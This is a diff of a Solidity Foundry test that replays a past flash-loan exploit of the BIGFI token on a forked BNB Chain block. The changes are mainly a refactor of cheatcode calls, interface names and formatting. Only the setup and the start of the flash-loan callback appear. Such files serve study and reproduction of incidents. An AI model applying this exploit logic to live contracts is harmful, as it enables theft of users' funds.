@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @TX
 // https://bscscan.com/tx/0x9fe19093a62a7037d04617b3ac4fbf5cb2d75d8cb6057e7e1b3c75cbbd5a5adc
@@ -28,18 +27,16 @@ contract ContractTest is Test {
     RDeflationERC20 BIGFI = RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA269556EdC45581F355742e46D2d722c5F3f551a);
-
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0xA269556EdC45581F355742e46D2d722c5F3f551a);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 26_685_503);
-        cheats.label(address(BIGFI), "BIGFI");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(swapFlashLoan), "swapFlashLoan");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(Pair), "Pair");
+        vm.createSelectFork("bsc", 26_685_503);
+        vm.label(address(BIGFI), "BIGFI");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(swapFlashLoan), "swapFlashLoan");
+        vm.label(address(Router), "Router");
+        vm.label(address(Pair), "Pair");
     }
 
     function testExploit() external {
@@ -50,13 +47,10 @@ contract ContractTest is Test {
         );
     }
 
-    function executeOperation(
-        address pool,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata params
-    ) external payable {
+    function executeOperation(address pool, address token, uint256 amount, uint256 fee, bytes calldata params)
+        external
+        payable
+    {
         USDTToBIGFI();
         // Calculate the number of burns
         // beforebalanceOf(Pair) == (_rOwned(Pair) * before_tTotal / _rTotal)
